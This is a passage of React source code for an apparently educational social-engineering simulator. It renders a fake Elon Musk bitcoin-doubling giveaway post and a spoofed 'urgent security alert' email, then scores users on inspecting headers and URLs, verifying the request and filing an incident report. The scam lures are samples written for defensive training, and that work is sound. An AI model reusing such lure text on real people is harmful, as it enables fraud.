              content: '🚀 Giving back to the crypto community! Send 0.1 BTC to the address below and I will send back 0.3 BTC! First 500 participants only. This is NOT a scam — verified by my team.',
              likes: 24190,
              comments: 9182,
              shares: 4821,
              time: '45m',
              isAttacker: true,
              attachedLink: { label: 'Crypto doubler — Official Elon Musk BTC Giveaway', url: 'http://elon-btc-giveaway.crypto-verified.test/send', safe: false },
            },
          ]}
          onClickLink={handleExposed}
          onDefend={handleDefend}
        />
      );
    }

    // Remaining simulations use enhanced GenericEnvironment
    return <GenericEnvironment sim={sim} onComplete={onComplete} />;
  };

  return (
    <VictimOSWrapper
      simId={sim.id}
      simTitle={sim.title}
      category={sim.category}
      brand={sim.brand}
      onDefend={handleDefend}
    >
      {renderContent()}
    </VictimOSWrapper>
  );
}

// Generic environment for simulations without custom components yet
function GenericEnvironment({ sim, onComplete }: { sim: SESimulation; onComplete: (outcome: 'safe' | 'compromised' | 'partial') => void }) {
  const { fireEvent } = useSimulationStore();
  const [senderInspected, setSenderInspected] = useState(false);
  const [urlInspected, setUrlInspected] = useState(false);
  const [showReportModal, setShowReportModal] = useState(false);
  const [verifyingChannel, setVerifyingChannel] = useState(false);
  const [verifiedChannelResult, setVerifiedChannelResult] = useState<string | null>(null);

  return (
    <div className="h-full flex flex-col bg-slate-950 text-slate-200 rounded-xl overflow-hidden border border-slate-800 p-4 space-y-4">
      {/* Environment header */}
      <div className="flex items-center gap-3 pb-3 border-b border-slate-800">
        <div className="w-8 h-8 rounded-lg bg-slate-800 border border-slate-700 flex items-center justify-center">
          <Terminal className="w-4 h-4 text-cyan-400" />
        </div>
        <div>
          <div className="font-bold text-sm text-slate-100">{sim.title}</div>
          <div className="text-[11px] text-slate-400">{sim.brand ?? 'Simulated Target Workstation'} — {sim.category}</div>
        </div>
        <div className="ml-auto flex items-center gap-2">
          <button
            onClick={() => setShowReportModal(true)}
            className="flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg border bg-rose-950/40 border-rose-800/60 text-rose-400 hover:bg-rose-900/60 font-semibold transition shadow-sm"
          >
            <Flag className="w-3.5 h-3.5" />
            <span>FILE SOC INCIDENT REPORT</span>
          </button>
        </div>
      </div>

      {/* Main interactive workstation UI */}
      <div className="flex-1 flex flex-col space-y-4">

        {/* Incoming Threat Message Box */}
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 space-y-3">
          <div className="flex items-start justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center font-bold text-cyan-400 text-sm flex-shrink-0">
                {(sim.brand ?? 'S').charAt(0)}
              </div>
              <div>
                <div className="font-bold text-sm text-slate-100 flex items-center gap-2">
                  <span>{sim.brand ?? 'External Alert / Request'}</span>
                  {senderInspected && (
                    <span className="text-[10px] bg-red-950/60 border border-red-800/40 text-red-400 px-1.5 py-0.5 rounded font-mono font-bold">
                      ⚠ UNVERIFIED DOMAIN
                    </span>
                  )}
                </div>
                <div className="text-[11px] text-slate-500 font-mono">
                  From: security-alert@{sim.brand?.toLowerCase().replace(/\s+/g, '-') || 'system'}-verification-update.test.invalid
                </div>
              </div>
            </div>
            <span className="text-[10px] bg-amber-950/50 text-amber-400 border border-amber-800/40 px-2 py-0.5 rounded font-mono font-bold">
              URGENT ACTION REQUESTED
            </span>
          </div>

          <div className="p-3 bg-slate-950 border border-slate-800 rounded-lg text-xs leading-relaxed text-slate-300">
            <p>{sim.summary || sim.goal}</p>
          </div>

          {/* Hands-on Interactive Payload Links / Attachments */}
          <div className="p-3 bg-red-950/20 border border-red-900/40 rounded-lg space-y-2">
            <div className="text-[10px] text-red-400 font-bold uppercase tracking-wider flex items-center gap-1.5">
              <AlertTriangle className="w-3.5 h-3.5" /> Direct Payload / Link Action (Test Hands-On Consequences)
            </div>
            <div className="flex flex-wrap items-center gap-2">
              <button
                onClick={() => {
                  fireEvent('LINK_OPENED', {
                    label: 'Clicked untrusted link / payload',
                    riskDelta: 30,
                    scoreDelta: -20,
                    isBranch: true,
                    attackerSees: 'Target executed malicious link/payload — session compromised',
                    exposedData: ['System credentials', 'Session token', 'Endpoint hostname'],
                  });
                  toast.error('Malicious payload executed! System compromised.');
                  setTimeout(() => onComplete('compromised'), 1000);
                }}
                className="px-4 py-2 rounded-lg bg-red-950/60 hover:bg-red-900 border border-red-800/60 text-red-300 font-mono text-xs transition flex items-center gap-2 cursor-pointer font-semibold"
              >
                <span>🔗 Execute Action Link / Download File Attachment</span>
              </button>
            </div>
          </div>

          {/* Hands-On Investigation Toolbar */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 pt-2 border-t border-slate-800">
            <button
              onClick={() => {
                if (!senderInspected) {
                  setSenderInspected(true);
                  fireEvent('SENDER_INSPECTED', {
                    label: 'Inspected sender domain headers',
                    riskDelta: -5,
                    scoreDelta: 10,
                    isInvestigative: true,
                    isDefensive: true,
                  });
                  toast.info('SPF/DKIM inspection completed — domain mismatch flagged!');
                }
              }}
              className={`py-2 px-3 rounded-lg border text-xs flex items-center justify-center gap-2 transition ${
                senderInspected
                  ? 'bg-cyan-950/40 border-cyan-800/60 text-cyan-400 font-bold'
                  : 'bg-slate-800 hover:bg-slate-700 border-slate-700 text-slate-300'
              }`}
            >
              <Eye className="w-3.5 h-3.5" />
              <span>{senderInspected ? 'Sender Inspected ✓ (SPF: FAIL)' : '1. Inspect Email Headers & Sender SPF'}</span>
            </button>

            <button
              onClick={() => {
                if (!urlInspected) {
                  setUrlInspected(true);
                  fireEvent('URL_INSPECTED', {
                    label: 'Analyzed link destination and SSL cert',
                    riskDelta: -5,
                    scoreDelta: 10,
                    isInvestigative: true,
                    isDefensive: true,
                  });
                  toast.info('Link destination analyzed — untrusted TLD flagged!');
                }
              }}
              className={`py-2 px-3 rounded-lg border text-xs flex items-center justify-center gap-2 transition ${
                urlInspected
                  ? 'bg-cyan-950/40 border-cyan-800/60 text-cyan-400 font-bold'
                  : 'bg-slate-800 hover:bg-slate-700 border-slate-700 text-slate-300'
              }`}
            >
              <Eye className="w-3.5 h-3.5" />
              <span>{urlInspected ? 'URL Inspected ✓ (SSL: UNTRUSTED)' : '2. Analyze Destination URL & SSL Chain'}</span>
            </button>
          </div>

          {/* Forensic Results Panel */}
          {(senderInspected || urlInspected) && (
            <div className="bg-slate-950 border border-cyan-900/60 rounded-xl p-3.5 space-y-2 font-mono text-xs modal-enter">
              <div className="text-cyan-400 font-bold text-[11px] flex items-center justify-between">
                <span className="flex items-center gap-1.5"><Terminal className="w-3.5 h-3.5" /> SOC FORENSIC INSPECTION LOG</span>
                <span className="text-[10px] bg-red-950/80 border border-red-800/60 text-red-400 px-2 py-0.5 rounded font-bold">THREAT CONFIRMED</span>
              </div>
              {senderInspected && (
                <div className="p-2 bg-slate-900/80 rounded border border-slate-800 text-[11px] text-slate-300 space-y-1">
                  <div><span className="text-slate-500">Header From: </span><span className="text-red-400 font-bold">security-alert@verification-update.test.invalid</span></div>
                  <div><span className="text-slate-500">SPF / DKIM Check: </span><span className="text-red-400 font-bold">FAIL (Spoofed envelope display name)</span></div>
                </div>
              )}
              {urlInspected && (
                <div className="p-2 bg-slate-900/80 rounded border border-slate-800 text-[11px] text-slate-300 space-y-1">
                  <div><span className="text-slate-500">Target Host: </span><span className="text-amber-400 font-bold">http://claim-reward-fast.test.invalid</span></div>
                  <div><span className="text-slate-500">SSL Certificate: </span><span className="text-red-400 font-bold">UNTRUSTED / Self-Signed (No EV Validation)</span></div>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Active Defense Verification Bar */}
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 space-y-3">
          <div className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
            <Shield className="w-4 h-4 text-emerald-400" /> Active Defense & Out-Of-Band Verification Tool
          </div>
          <p className="text-xs text-slate-400">
            Never trust unsolicited requests. Verify through independent corporate channels or submit an official incident report.
          </p>

          <div className="flex flex-wrap items-center gap-3">
            <button
              onClick={() => {
                setVerifyingChannel(true);
                setTimeout(() => {
                  setVerifyingChannel(false);
                  setVerifiedChannelResult('CONFIRMED SCAM: Official IT/Security Helpdesk confirmed NO password reset or urgent request was issued.');
                  fireEvent('VERIFICATION_PERFORMED', {
                    label: 'Verified request out-of-band via official IT helpdesk',
                    riskDelta: -20,
                    scoreDelta: 20,
                    isDefensive: true,
                  });
                  toast.success('Out-of-band verification completed!');
                }, 700);
              }}
              disabled={verifyingChannel}
              className="px-4 py-2 rounded-lg bg-emerald-950/60 hover:bg-emerald-900 border border-emerald-800/60 text-emerald-300 text-xs font-bold transition flex items-center gap-2"
            >
              {verifyingChannel ? (
                <>
                  <div className="w-3 h-3 border-2 border-emerald-400 border-t-transparent rounded-full animate-spin" />
                  <span>Connecting to Helpdesk...</span>
                </>
              ) : (
                <>
                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                  <span>Run Out-Of-Band IT Helpdesk Verification</span>
                </>
              )}
            </button>

            <button
              onClick={() => setShowReportModal(true)}
              className="px-4 py-2 rounded-lg bg-rose-950/60 hover:bg-rose-900 border border-rose-800/60 text-rose-300 text-xs font-bold transition flex items-center gap-2"
            >
              <Flag className="w-4 h-4 text-rose-400" />
              <span>Submit IoC Incident Report & Isolate Target</span>
            </button>
          </div>

          {verifiedChannelResult && (
            <div className="p-3 bg-emerald-950/30 border border-emerald-800/50 rounded-lg text-xs text-emerald-300 font-semibold space-y-2 modal-enter">
              <div>✓ {verifiedChannelResult}</div>
              <button
                onClick={() => {
                  toast.success('🎉 Active defense verified! Now answer the lab questions on the left side to complete the lab!', { duration: 6000 });
                }}
                className="px-3 py-1.5 rounded bg-emerald-600 text-white font-bold text-xs hover:bg-emerald-500 transition"
              >
                Verification Recorded (Answer Questions on Left)
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Incident Report Modal */}
      {showReportModal && (
        <IncidentReportModal
          simId={sim.id}
          simTitle={sim.title}
          category={sim.category}
          onClose={() => setShowReportModal(false)}
          onSubmitReport={(reportData) => {
            setShowReportModal(false);
            fireEvent('REPORT_FILED', {
              label: `Filed SOC Report for ${reportData.ioc}`,
              riskDelta: -30,
              scoreDelta: 25,
              isDefensive: true,
              isBranch: true,
              attackerSees: `Attacker domain ${reportData.ioc} blocked at firewall`,
            });
            toast.success('🎉 Incident reported successfully! Now answer the lab questions on the left side to complete the lab!', { duration: 6000 });
          }}
        />
      )}
    </div>
  );
}

// =============================================
// MAIN SIMULATION CLIENT
// =============================================
export default function SimulationClient({ sim }: { sim: SESimulation }) {
  const navigate = useNavigate();
  const { startSession, completeSession, session, showDebrief } = useSimulationStore();
  const completeSimulation = useCyberStore(s => s.completeSimulation);
  const [started, setStarted] = useState(false);
  const [timer, setTimer] = useState(sim.duration * 60);
  const [showKnowMore, setShowKnowMore] = useState(false);

  // Timer countdown
  useEffect(() => {
    if (!started || showDebrief) return;
    const t = setInterval(() => {
      setTimer(s => {
        if (s <= 1) { clearInterval(t); return 0; }
        return s - 1;
      });
    }, 1000);
    return () => clearInterval(t);
  }, [started, showDebrief]);

  const handleStart = () => {
    setStarted(true);
    startSession(sim);
    toast.info(`${sim.id}: ${sim.title} — Simulation started`);
  };

  const handleComplete = useCallback((outcome: 'safe' | 'compromised' | 'partial') => {
    completeSession(outcome);
    // Award XP and record result
    const sess = useSimulationStore.getState().session;
    const score = sess?.score ?? 60;
    const stars = score >= 90 ? 3 : score >= 70 ? 2 : 1;
    completeSimulation({
      id: sim.id,
      numericId: sim.numericId,
      title: sim.title,
      difficulty: sim.difficulty,
      stars,
      score,
      date: new Date().toISOString(),
      outcome,
    });
  }, [completeSession, completeSimulation, sim]);

  const handleReplay = () => {
    setTimer(sim.duration * 60);
    startSession(sim);
  };

  const formatTimer = (s: number) => `${String(Math.floor(s/60)).padStart(2,'0')}:${String(s%60).padStart(2,'0')}`;

  const rc = riskColors[session?.riskLevel ?? 'SAFE'];
  const catColor = categoryToColor[sim.category] ?? categoryToColor.default;

  // ---- PRE-START SCREEN ----
  if (!started) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center p-6 bg-slate-950">
        <div className="max-w-xl w-full bg-slate-900 border border-slate-800 rounded-2xl p-8 space-y-6 text-center shadow-2xl">
          <div className={`inline-flex items-center gap-2 px-3 py-1.5 rounded-full text-xs border ${catColor}`}>
            {sim.category}
          </div>
          <div>
            <div className="text-slate-400 text-sm font-mono mb-1">{sim.id}</div>
            <h1 className="text-2xl font-black text-white">{sim.title}</h1>
          </div>
          <div className="flex items-center justify-center gap-6 text-sm text-slate-400">
            <span className={`font-semibold ${difficultyColor[sim.difficulty]}`}>{sim.difficulty}</span>
            <span className="flex items-center gap-1.5"><Clock className="w-4 h-4" />{sim.duration} min</span>
            <span className="flex items-center gap-1.5"><Zap className="w-4 h-4 text-cyan-400 " />{sim.xp} XP</span>
          </div>
          <p className="text-slate-400 text-sm leading-relaxed">{sim.summary}</p>
          <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 space-y-2 text-left">
            <div className="text-cyan-400 text-xs font-bold uppercase">Learning Objectives</div>
            {sim.learningObjectives.map((obj, i) => (
              <div key={i} className="flex items-start gap-2 text-xs text-slate-300">
                <CheckCircle2 className="w-3.5 h-3.5 text-cyan-500 flex-shrink-0 mt-0.5" />
                {obj}
              </div>
            ))}
          </div>
          <div className="flex items-center justify-center gap-3">
            <Link to="/simulation" className="px-4 py-2.5 rounded-lg border border-slate-700 text-slate-300 hover:bg-slate-800 transition text-sm flex items-center gap-1.5">
              <ChevronLeft className="w-4 h-4" /> Back
            </Link>
            <button
              onClick={() => setShowKnowMore(true)}
              className="px-5 py-2.5 rounded-lg border border-cyan-800/60 bg-cyan-950/40 text-cyan-300 hover:bg-cyan-900/60 hover:text-white transition text-sm font-semibold flex items-center gap-1.5"
            >
              <Info className="w-4 h-4 text-cyan-400" />
              Know More Details
            </button>
            <button onClick={handleStart} className="px-7 py-2.5 rounded-lg bg-gradient-to-r from-cyan-600 to-blue-600 text-white font-bold text-sm hover:brightness-110 transition flex items-center gap-2 shadow-lg shadow-cyan-900/30">
              <PlayCircle className="w-4 h-4" />
              Launch Simulation
            </button>
          </div>
          <div className="text-[11px] text-slate-600">
            All environments are simulated. No real data is collected or transmitted.
          </div>
        </div>

        {showKnowMore && (
          <KnowMoreModal sim={sim} onClose={() => setShowKnowMore(false)} />
        )}
      </div>
    );
  }

  return (
    <div className="h-screen flex flex-col bg-slate-950 overflow-hidden">
      {!showDebrief ? (
        <TryHackMeRoom
          sim={sim}
          onComplete={handleComplete}
          onOpenKnowMore={() => setShowKnowMore(true)}
        >
          <VictimEnvironment sim={sim} onComplete={handleComplete} />
        </TryHackMeRoom>
      ) : (
        // Debrief screen
        <DebriefScreen
          sim={sim}
          onReplay={handleReplay}
          onExit={() => { navigate('/simulation'); }}
        />
      )}

      {/* Know More Details Modal */}
      {showKnowMore && (
        <KnowMoreModal sim={sim} onClose={() => setShowKnowMore(false)} />
      )}
    </div>
  );
}
